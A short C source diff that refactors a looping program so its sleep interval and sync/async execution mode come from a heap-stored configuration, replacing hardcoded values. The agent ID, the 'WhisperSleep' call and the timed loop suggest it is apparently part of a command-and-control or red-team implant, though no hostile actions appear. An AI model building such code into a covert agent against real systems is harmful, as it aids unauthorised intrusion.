@@ -73,7 +73,6 @@ int main()
     // move to heapstruct
     char agent_id[37];
     generate_uuid4(agent_id);
-    // CONFIG *config = init_config();
 
     // Example of setting the execution mode (you can do this at any point in your code)
     set_execution_mode(EXEC_MODE_SYNC, heapStorePointer); // Initially run synchronously
@@ -85,7 +84,7 @@ int main()
 
         // WhisperSleep(get_sleep_time());
         // Sleep is in MS, so we take the input of sleep time * 1000 to get seconds
-        WhisperSleep(1000 * 10); // get_sleep_time(config));
+        WhisperSleep(1000 * get_sleep_time(heapStorePointer));
     }
 
     return 0;
@@ -105,8 +104,7 @@ void execution_setup(char *agent_id, HeapStore *heapStorePointer)
     exec_args->agent_id = agent_id;
     exec_args->heapStorePointer = heapStorePointer;
 
-    // switch (get_execution_mode(config))
-    switch (EXEC_MODE_ASYNC)
+    switch (get_execution_mode(heapStorePointer))
     {
     case EXEC_MODE_ASYNC:
     {
